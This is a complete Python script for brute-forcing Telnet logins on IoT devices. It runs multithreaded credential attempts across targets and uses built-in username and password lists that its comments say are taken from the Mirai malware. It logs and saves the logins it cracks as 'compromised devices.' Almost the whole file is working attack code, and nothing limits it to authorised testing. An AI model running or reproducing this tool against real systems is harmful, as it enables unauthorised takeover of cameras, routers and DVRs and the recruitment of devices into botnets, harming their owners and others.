#!/usr/bin/env python3
"""
Telnet Brute Force Module
Attempts to crack Telnet credentials using common username/password combinations
"""

import telnetlib
import threading
import time
import itertools
from typing import List, Dict, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

class TelnetBruteForcer:
    def __init__(self, timeout: int = 5, max_threads: int = 20, delay: float = 0.1):
        """
        Initialize Telnet brute forcer
        
        Args:
            timeout: Connection timeout in seconds
            max_threads: Maximum number of concurrent threads
            delay: Delay between attempts to avoid overwhelming targets
        """
        self.timeout = timeout
        self.max_threads = max_threads
        self.delay = delay
        self.successful_logins = []
        self.failed_attempts = []
        self.results_lock = threading.Lock()
    
    def attempt_login(self, ip: str, port: int, username: str, password: str) -> Dict:
        """
        Attempt a single Telnet login
        
        Args:
            ip: Target IP address
            port: Target port
            username: Username to try
            password: Password to try
        
        Returns:
            Dictionary with attempt result
        """
        result = {
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'success': False,
            'banner': '',
            'error': '',
            'timestamp': time.time()
        }
        
        try:
            # Apply delay to avoid overwhelming target
            time.sleep(self.delay)
            
            # Attempt Telnet connection
            tn = telnetlib.Telnet(ip, port, timeout=self.timeout)
            
            # Get initial banner
            try:
                banner = tn.read_until(b"login:", timeout=3).decode('utf-8', errors='ignore')
                result['banner'] = banner.strip()[:200]
            except:
                # Some devices might not show "login:" prompt
                pass
            
            # Send username
            tn.write(username.encode('utf-8') + b"\n")
            
            # Wait for password prompt
            try:
                tn.read_until(b"assword:", timeout=3)
            except:
                # Some devices have different prompts
                pass
            
            # Send password
            tn.write(password.encode('utf-8') + b"\n")
            
            # Check response
            try:
                response = tn.read_until(b"#", timeout=5).decode('utf-8', errors='ignore')
                
                # Look for success indicators
                success_indicators = [
                    "#", "$", ">", "~",  # Common shell prompts
                    "BusyBox", "OpenWrt", "welcome", "Welcome"
                ]
                
                failure_indicators = [
                    "incorrect", "failed", "denied", "invalid",
                    "login:", "password:", "Login incorrect"
                ]
                
                response_lower = response.lower()
                
                # Check for failure first (more specific)
                if any(indicator in response_lower for indicator in failure_indicators):
                    result['success'] = False
                # Then check for success
                elif any(indicator in response_lower for indicator in success_indicators):
                    result['success'] = True
                # If we got a shell prompt character at the end
                elif response.strip().endswith(('#', '$', '>', '~')):
                    result['success'] = True
                
            except:
                # Timeout might indicate success if we're waiting for shell
                pass
            
            tn.close()
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def brute_force_target(self, ip: str, port: int = 23, 
                          usernames: List[str] = None, 
                          passwords: List[str] = None,
                          stop_on_success: bool = True) -> List[Dict]:
        """
        Brute force a single target with multiple credentials
        
        Args:
            ip: Target IP address
            port: Target port
            usernames: List of usernames to try
            passwords: List of passwords to try
            stop_on_success: Stop after first successful login
        
        Returns:
            List of attempt results
        """
        if not usernames:
            usernames = self.get_default_usernames()
        if not passwords:
            passwords = self.get_default_passwords()
        
        # Generate all username/password combinations
        credentials = list(itertools.product(usernames, passwords))
        
        print(f"[+] Brute forcing {ip}:{port} with {len(credentials)} combinations...")
        print(f"[+] Usernames: {len(usernames)}, Passwords: {len(passwords)}")
        
        results = []
        found_success = False
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all credential attempts
            future_to_creds = {
                executor.submit(self.attempt_login, ip, port, username, password): (username, password)
                for username, password in credentials
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_creds):
                if stop_on_success and found_success:
                    # Cancel remaining futures if we found success
                    future.cancel()
                    continue
                
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result['success']:
                        found_success = True
                        print(f"[+] SUCCESS: {ip}:{port} - {result['username']}:{result['password']}")
                        
                        with self.results_lock:
                            self.successful_logins.append(result)
                        
                        if stop_on_success:
                            print(f"[+] Stopping brute force - success found!")
                            break
                    else:
                        with self.results_lock:
                            self.failed_attempts.append(result)
                        
                        # Print progress occasionally
                        if len(results) % 50 == 0:
                            print(f"[*] Tried {len(results)}/{len(credentials)} combinations...")
                    
                except Exception as e:
                    username, password = future_to_creds[future]
                    print(f"[-] Error trying {username}:{password} on {ip}:{port} - {e}")
        
        return results
    
    def brute_force_multiple_targets(self, targets: List[Tuple[str, int]],
                                   usernames: List[str] = None,
                                   passwords: List[str] = None) -> List[Dict]:
        """
        Brute force multiple targets
        
        Args:
            targets: List of (ip, port) tuples
            usernames: List of usernames to try
            passwords: List of passwords to try
        
        Returns:
            List of all attempt results
        """
        all_results = []
        
        print(f"[+] Starting brute force attack on {len(targets)} targets...")
        
        for i, (ip, port) in enumerate(targets, 1):
            print(f"\n[+] Target {i}/{len(targets)}: {ip}:{port}")
            
            results = self.brute_force_target(ip, port, usernames, passwords)
            all_results.extend(results)            
            # Small delay between targets
            time.sleep(1)
        
        return all_results
    
    def get_default_usernames(self) -> List[str]:
        """Get list of common IoT device usernames based on Mirai and other IoT malware"""
        return [
            # Generic accounts
            "admin", "administrator", "root", "user", "guest", "test",
            
            # Empty username (very common in IoT)
            "",
            
            # IoT device defaults - found in Mirai
            "ubnt", "pi", "raspberry", "debian", "ubuntu", "support",
            
            # Camera defaults - commonly targeted by Mirai
            "camera", "viewer", "operator", "service", "tech", "supervisor",
            "hikvision", "dahua", "axis", "admin1", "666666", "888888",
            
            # Router defaults - targeted by Mirai variants
            "cisco", "linksys", "netgear", "dlink", "tplink", "huawei",
            "zte", "router", "supervisor", "vstarcam",
            
            # Service accounts
            "ftp", "www", "http", "ssh", "telnet", "mail", "daemon",
            
            # DVR/NVR accounts
            "dvr", "nvr", "anko", "supervisor", "realtek",
            
            # Numeric accounts
            "1", "123", "admin1", "user1", "54321", "666666", "888888",
            
            # Default IoT usernames
            "device", "default", "support", "maintenance", "fiberhome",
            "iot", "smart", "sensor", "monitor", "customer",
            
            # Mirai-specific additions
            "mother", "tech", "CRAFTSPERSON", "telecomadmin", "alpine",
            "qkrxpbwl", "xc3511", "vizxv", "xmhdipc", "juantech",
            "7ujMko0admin", "7ujMko0vizxv", "klv123", "klv1234", "jvbzd",            "7ujMko0admin", "system", "ikwb"
        ]
    
    def get_default_passwords(self) -> List[str]:
        """Get list of common IoT device passwords based on Mirai and other IoT malware"""
        return [
            # Empty password (very common in IoT)
            "",
            
            # Most common passwords
            "admin", "password", "123456", "12345", "1234", "default",
            "admin123", "root", "pass", "guest", "000000", "111111",
            
            # Mirai-specific passwords from its source code
            "xc3511", "vizxv", "888888", "xmhdipc", "default", "juantech",
            "123456", "54321", "support", "12345", "jvbzd", "klv123",
            "klv1234", "Zte521", "hi3518", "7ujMko0admin", "7ujMko0vizxv",
            "system", "ikwb", "dreambox", "user", "realtek", "00000000",
            
            # IoT device defaults
            "ubnt", "raspberry", "pi", "debian", "ubuntu", "alpine",
            "camera", "security", "system", "service", "supervisor",
            
            # Router defaults
            "cisco", "linksys", "netgear", "dlink", "tplink", "huawei",
            "router", "wireless", "internet", "admin1234", "changeme",
            
            # Numeric patterns
            "0000", "1111", "2222", "9999", "0123", "1234567890",
            "123123", "321321", "987654321", "9876", "54321",
            
            # Default combinations
            "admin1", "admin123", "root123", "pass123", "abc123",
            "user123", "test123", "guest123", "password123",
            
            # Camera/DVR passwords
            "hikvision", "dahua", "axis", "supervisor", "ivdev",
            "swann", "meinsm", "anko", "vstarcam", "xc3511",
            
            # Mirai-specific credentials part 2
            "antslq", "oelinux123", "CRAFTSPERSON", "1001chin",
            "cat1029", "S2fGqNFs", "telnet", "telecomadmin",
            "zlxx.", "zlxx..", "Zte521", "hi3518",
              # Common IoT
            "changeme", "letmein", "welcome", "qwerty", "123qwe",
            "administrator", "root123456", "1q2w3e4r",
            "qwerty123", "firewall", "adsl1234", "adminadmin",
            "motorola", "vertex25ektks123",
              # Years and dates
            "2024", "2023", "2022", "2021", "2020",
            
            # Device specific
            "device", "camera1", "dvr123", "nvr123",
            "iot123", "smart123", "sensor123"
        ]
    
    def get_successful_logins(self) -> List[Dict]:
        """Get all successful login attempts"""
        with self.results_lock:
            return self.successful_logins.copy()
    
    def get_failed_attempts(self) -> List[Dict]:
        """Get all failed login attempts"""
        with self.results_lock:
            return self.failed_attempts.copy()
    
    def save_results(self, results: List[Dict], filename: str = None):
        """Save brute force results to file"""
        if not filename:
            timestamp = int(time.time())
            filename = f"bruteforce_results_{timestamp}.txt"
        
        try:
            successful = [r for r in results if r['success']]
            failed = [r for r in results if not r['success']]
            
            with open(filename, 'w') as f:
                f.write("Telnet Brute Force Results\n")
                f.write("=========================\n\n")
                f.write(f"Attack completed at: {time.ctime()}\n")
                f.write(f"Total attempts: {len(results)}\n")
                f.write(f"Successful logins: {len(successful)}\n")
                f.write(f"Failed attempts: {len(failed)}\n\n")
                
                if successful:
                    f.write("SUCCESSFUL LOGINS:\n")
                    f.write("-" * 40 + "\n")
                    for result in successful:
                        f.write(f"{result['ip']}:{result['port']} - ")
                        f.write(f"{result['username']}:{result['password']}\n")
                        if result['banner']:
                            f.write(f"  Banner: {result['banner'][:100]}\n")
                    f.write("\n")
                
                f.write("DETAILED RESULTS:\n")
                f.write("-" * 40 + "\n")
                for result in results:
                    status = "SUCCESS" if result['success'] else "FAILED"
                    f.write(f"{result['ip']}:{result['port']} - ")
                    f.write(f"{result['username']}:{result['password']} - {status}\n")
                    if result['error']:                        f.write(f"  Error: {result['error']}\n")
            print(f"[+] Results saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving results: {e}")
    
    def print_summary(self, results: List[Dict]):
        """Print brute force summary"""
        if not results:
            print("[-] No brute force results to display")
            return
        
        successful = [r for r in results if r['success']]
        failed = [r for r in results if not r['success']]
        
        print(f"\n{'='*60}")
        print(f"           BRUTE FORCE SUMMARY")
        print(f"{'='*60}")
        print(f"Total Attempts: {len(results)}")
        print(f"Successful Logins: {len(successful)}")
        print(f"Failed Attempts: {len(failed)}")
        
        if len(results) > 0:
            success_rate = (len(successful) / len(results)) * 100
            print(f"Success Rate: {success_rate:.1f}%")
        
        if successful:
            print(f"\nCompromised Devices:")
            print(f"-" * 40)
            for result in successful:
                print(f"  {result['ip']}:{result['port']} - {result['username']}:{result['password']}")
                if result['banner']:
                    print(f"    Banner: {result['banner'][:60]}...")
        print(f"{'='*60}\n")
    
    def load_wordlist(filename: str) -> List[str]:
        """Load wordlist from file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {filename}")
            return []
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
            return []

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python bruteforce.py <target_ip> [port]")
        print("  python bruteforce.py <target_ip>:<port>")
        print("")
        print("Examples:")
        print("  python bruteforce.py 192.168.1.100")
        print("  python bruteforce.py 192.168.1.100 2323")
        print("  python bruteforce.py 192.168.1.100:23")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Parse target
    if ":" in target:
        ip, port = target.split(":")
        port = int(port)
    else:
        ip = target
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 23
    
    # Initialize brute forcer
    brute_forcer = TelnetBruteForcer(timeout=5, max_threads=10, delay=0.2)
    
    # Start brute force attack
    print(f"[+] Starting Telnet brute force attack on {ip}:{port}")
    results = brute_forcer.brute_force_target(ip, port)
    
    # Print summary and save results
    brute_forcer.print_summary(results)
    brute_forcer.save_results(results)
